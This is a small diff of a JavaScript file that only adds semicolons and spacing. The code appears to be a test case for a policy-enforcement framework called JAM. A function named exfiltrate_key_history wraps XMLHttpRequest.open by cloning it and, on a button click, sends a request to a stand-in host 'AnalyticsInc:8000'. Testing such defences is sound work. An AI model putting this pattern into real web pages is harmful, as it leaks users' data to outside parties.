@@ -2,16 +2,16 @@
 function exfiltrate_key_history() {
   function v0() {
     function temp() {
-      return JAM.call(that.apply, that, [this, arguments], JAM.policy.p1)
+      return JAM.call(that.apply, that, [this, arguments], JAM.policy.p1);
     }
     var that = this;
     var key$$14;
-    for(key$$14 in this) {
-      if(JAM.call(this.hasOwnProperty, this, [key$$14], JAM.policy.p1)) {
-        JAM.set(temp, key$$14, this[key$$14])
+    for (key$$14 in this) {
+      if (JAM.call(this.hasOwnProperty, this, [key$$14], JAM.policy.p1)) {
+        JAM.set(temp, key$$14, this[key$$14]);
       }
     }
-    return temp
+    return temp;
   }
   xmlhttp = new XMLHttpRequest;
   xmlhttp.open.clone = v0;
@@ -21,6 +21,6 @@ function exfiltrate_key_history() {
   v3.opennew = v6;
   JAM.call(xmlhttp.opennew, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=clone3", true], JAM.policy.p1);
   JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p1);
-  return
+  return;
 }
 JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
